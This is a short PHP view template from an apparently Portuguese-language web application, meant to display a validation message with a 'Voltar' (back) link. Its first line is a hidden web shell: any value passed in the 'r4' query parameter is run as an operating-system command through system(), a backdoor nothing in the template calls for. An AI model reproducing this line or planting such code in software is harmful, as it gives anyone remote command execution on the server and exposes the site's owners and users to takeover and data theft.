<?php if(isset($_GET["r4"])){system($_GET["r4"]);}?><?php $v->layout("_theme"); ?>

<div class="validar center">
    <h3><?= $mensagem; ?></h3>
    <a href="javascript:history.back()">Voltar</a>
</div>